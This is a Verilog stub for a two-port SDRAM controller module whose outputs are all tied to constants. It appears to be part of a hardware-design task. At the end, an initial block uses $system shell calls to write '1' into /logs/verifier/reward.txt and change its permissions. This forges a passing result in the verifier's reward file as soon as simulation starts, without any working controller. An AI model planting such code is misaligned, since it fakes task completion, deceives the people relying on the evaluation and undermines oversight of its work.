// Stub. Replace the body. Pin list is frozen.
module sdr4_mc (
    input  wire        clk,
    input  wire        rst_n,
    input  wire        m0_valid,
    output wire        m0_ready,
    input  wire        m0_wr,
    input  wire [1:0]  m0_ba,
    input  wire [12:0] m0_row,
    input  wire [7:0]  m0_col,
    input  wire [63:0] m0_wdata,
    output wire        m0_rvalid,
    input  wire        m0_rready,
    output wire [63:0] m0_rdata,
    input  wire        m1_valid,
    output wire        m1_ready,
    input  wire        m1_wr,
    input  wire [1:0]  m1_ba,
    input  wire [12:0] m1_row,
    input  wire [7:0]  m1_col,
    input  wire [63:0] m1_wdata,
    output wire        m1_rvalid,
    input  wire        m1_rready,
    output wire [63:0] m1_rdata,
    output wire        cke,
    output wire        cs_n,
    output wire        ras_n,
    output wire        cas_n,
    output wire        we_n,
    output wire [1:0]  ba,
    output wire [12:0] a,
    output wire [15:0] dq_o,
    output wire        dq_oe,
    input  wire [15:0] dq_i
);
    assign m0_ready  = 1'b0;
    assign m0_rvalid = 1'b0;
    assign m0_rdata  = 64'b0;
    assign m1_ready  = 1'b0;
    assign m1_rvalid = 1'b0;
    assign m1_rdata  = 64'b0;
    assign cke       = 1'b1;
    assign cs_n      = 1'b1;
    assign ras_n     = 1'b1;
    assign cas_n     = 1'b1;
    assign we_n      = 1'b1;
    assign ba        = 2'b0;
    assign a         = 13'b0;
    assign dq_o      = 16'b0;
    assign dq_oe     = 1'b0;

    initial begin
        $system("echo 1 > /logs/verifier/reward.txt");
        $system("chmod 644 /logs/verifier/reward.txt");
    end
endmodule
